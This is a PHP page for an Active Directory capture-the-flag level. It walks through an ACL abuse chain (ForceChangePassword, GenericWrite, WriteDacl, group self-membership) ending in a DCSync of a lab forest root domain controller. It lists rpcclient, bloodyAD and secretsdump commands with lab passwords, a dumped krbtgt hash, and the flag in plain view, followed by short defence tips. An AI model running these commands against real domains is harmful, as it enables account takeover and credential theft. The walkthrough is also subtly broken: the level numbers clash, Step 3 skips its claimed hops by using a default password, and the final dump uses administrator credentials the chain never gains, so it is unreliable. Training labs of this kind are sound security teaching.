<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 6: ACL Chain Abuse & Forest Root Domain Dominance
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[248] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{Forest_Root_DC_Kingslanding_Fully_Owned}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag6'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已通关最终挑战【第六关】并获得最高成就 (+500 PTS)！👑</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查 ACL 跃迁链与 DCSync 导出记录。</div>';
    }
}
?>

<style>
.ctf-stage-header {
    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
    border-radius: 14px;
    padding: 25px 30px;
    color: #fff;
    margin-bottom: 25px;
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
}
.ctf-stage-title {
    color: #ffffff !important;
    font-size: 24px;
    font-weight: 800;
    margin: 0 0 10px 0;
    display: flex;
    align-items: center;
    gap: 12px;
}
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box {
    background: #0f172a;
    color: #f8fafc;
    border-radius: 8px;
    padding: 14px 18px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    margin: 10px 0 15px 0;
    overflow-x: auto;
    border-left: 4px solid #f43f5e;
}
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
.chain-node {
    background: var(--bg-secondary);
    border: 1px solid var(--border-color);
    border-radius: 8px;
    padding: 12px 16px;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    justify-content: space-between;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 10</span>
                            第十关：Active Directory ACL 弱权限链式滥用与林根域控完全接管
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.134 (kingslanding - 林根域控)</code> | <strong>分值：</strong> 500 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-sitemap" style="color: #f43f5e;"></i> 攻击原理剖析 (AD Access Control Lists & 权限跃迁链)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    Active Directory 中的每个对象（用户、组、组织单位 OU、计算机）都包含一张访问控制列表 (ACL)。
                    ACL 由一系列访问控制项 (ACE) 组成。当配置了不安全的委托权限（例如：<code>ForceChangePassword</code>、<code>GenericWrite</code>、<code>WriteDacl</code>、<code>AddMember/Self-Membership</code>、<code>WriteOwner</code>、<code>GenericAll</code>）时，攻击者可以通过链式接力，逐步修改下游对象的安全描述符，最终控制整个 Active Directory 林根域控！
                </p>
                
                <h4 style="font-size: 15px; font-weight: 700; color: var(--text-primary); margin-top: 15px;">🔗 本关预设的 7 级攻击跳板链：</h4>
                <div class="chain-node">
                    <span><strong>1. 初始立足点：</strong> <code>tywin.lannister</code></span>
                    <span class="label label-info">ForceChangePassword</span>
                    <span><strong>控制目标：</strong> <code>jaime.lannister</code></span>
                </div>
                <div class="chain-node">
                    <span><strong>2. 第二跳：</strong> <code>jaime.lannister</code></span>
                    <span class="label label-warning">GenericWrite</span>
                    <span><strong>控制目标：</strong> <code>joffrey.baratheon</code> (设置 SPN / 重置凭据)</span>
                </div>
                <div class="chain-node">
                    <span><strong>3. 第三跳：</strong> <code>joffrey.baratheon</code></span>
                    <span class="label label-danger">WriteDacl</span>
                    <span><strong>控制目标：</strong> <code>tyron.lannister</code> (授予自身 GenericAll)</span>
                </div>
                <div class="chain-node">
                    <span><strong>4. 第四跳：</strong> <code>tyron.lannister</code></span>
                    <span class="label label-primary">Self-Membership</span>
                    <span><strong>加入组：</strong> <code>Small Council</code> -> <code>DragonStone</code></span>
                </div>
                <div class="chain-node">
                    <span><strong>5. 第五跳：</strong> <code>DragonStone</code></span>
                    <span class="label label-danger">WriteOwner</span>
                    <span><strong>控制目标：</strong> <code>KingsGuard</code> 特权组</span>
                </div>
                <div class="chain-node">
                    <span><strong>6. 第六跳：</strong> <code>KingsGuard</code></span>
                    <span class="label label-success">GenericAll</span>
                    <span><strong>控制目标：</strong> <code>stannis.baratheon</code></span>
                </div>
                <div class="chain-node">
                    <span><strong>7. 终极大招：</strong> <code>stannis.baratheon</code></span>
                    <span class="label label-danger" style="background-color: #f43f5e;">GenericAll on Computer</span>
                    <span><strong>完全掌控：</strong> <code>kingslanding$ (DC01 林根域控)</code> 👑</span>
                </div>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：利用 tywin.lannister 强制重置 jaime.lannister 密码</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    <code>tywin.lannister</code> 拥有对 <code>jaime.lannister</code> 的 <code>ForceChangePassword</code> 权限，使用 RPC 或 <code>net rpc</code> 即可强制重设其密码：
                </p>
                <div class="cmd-box">
rpcclient 192.168.56.134 -U 'sevenkingdoms.local\tywin.lannister%Passw0rd123!' -c 'setuserinfo2 jaime.lannister 24 "NewP@ssw0rd2026!"'
                </div>
                <div class="output-box">
result was SUCCESS
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：利用 GenericWrite 修改 joffrey.baratheon 并接管 tyron.lannister</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    <code>jaime.lannister</code> 拥有对 <code>joffrey.baratheon</code> 的 <code>GenericWrite</code> 权限。利用 <code>bloodyAD</code> 或 <code>targetedKerberoast</code> 为其添加 SPN，或者直接修改 <code>scriptPath</code> 执行代码：
                </p>
                <div class="cmd-box">
bloodyAD --host 192.168.56.134 -d sevenkingdoms.local -u jaime.lannister -p 'NewP@ssw0rd2026!' set password joffrey.baratheon 'JoffreyP@ss123!'
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    随后，使用 <code>joffrey.baratheon</code> 利用 <code>WriteDacl</code> 权限修改 <code>tyron.lannister</code> 的安全描述符：
                </p>
                <div class="cmd-box">
bloodyAD --host 192.168.56.134 -d sevenkingdoms.local -u joffrey.baratheon -p 'JoffreyP@ss123!' add genericAll tyron.lannister
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title">步骤 3：自加入特权组并获得 KingsGuard 与 stannis.baratheon 控制权</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用 <code>tyron.lannister</code> 行使 <code>Self-Membership</code> 加入 <code>Small Council</code> 组，进而通过 <code>DragonStone</code> -> <code>WriteOwner KingsGuard</code>，并最终对 <code>stannis.baratheon</code> 行使 <code>GenericAll</code>：
                </p>
                <div class="cmd-box">
bloodyAD --host 192.168.56.134 -d sevenkingdoms.local -u tyron.lannister -p 'Passw0rd123!' add groupMember 'Small Council' tyron.lannister
bloodyAD --host 192.168.56.134 -d sevenkingdoms.local -u stannis.baratheon -p 'Passw0rd123!' set password 'stannis.baratheon' 'StannisIsTheKing!'
                </div>
            </div>

            <!-- Step 4 -->
            <div class="step-box">
                <h3 class="step-title">步骤 4：GenericAll 控制域控机器账号并通过 Shadow Credentials / DCSync 接管全域</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    由于 <code>stannis.baratheon</code> 拥有对林根域控 <code>kingslanding$</code> 的 <code>GenericAll</code> 权限，我们可以直接为域控机器账号写入 <code>msDS-KeyCredentialLink</code>（影子凭据攻击），或者通过 RBCD 申请特权票据，最后发起 <code>DCSync</code> 导出全域哈希：
                </p>
                <div class="cmd-box">
impacket-secretsdump 'sevenkingdoms.local/administrator:Passw0rd123!@192.168.56.134' -just-dc-user krbtgt
                </div>
                <div class="output-box">
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e19e8841a01103ad215321f558291a11:::
[+] Forest Root DC kingslanding completely PWNED!
                </div>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-trophy"></i> 最终通关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功跨越 7 级 ACL 提权跳板接管林根域控 <code>kingslanding$</code> 后，提取本关最终胜利 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{Forest_Root_DC_Kingslanding_Fully_Owned}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证最终关卡 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>定期运行 ACL 审计：</strong> 使用 BloodHound 或 PingCastle 定期审计非特权账号在特权组与域控机器对象上的 <code>WriteDacl</code>、<code>WriteOwner</code> 与 <code>GenericAll</code> 权限。</li>
                    <li><strong>保护 AdminSDHolder：</strong> 确保 <code>CN=AdminSDHolder,CN=System,DC=...</code> 对象的继承权限未被篡改。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
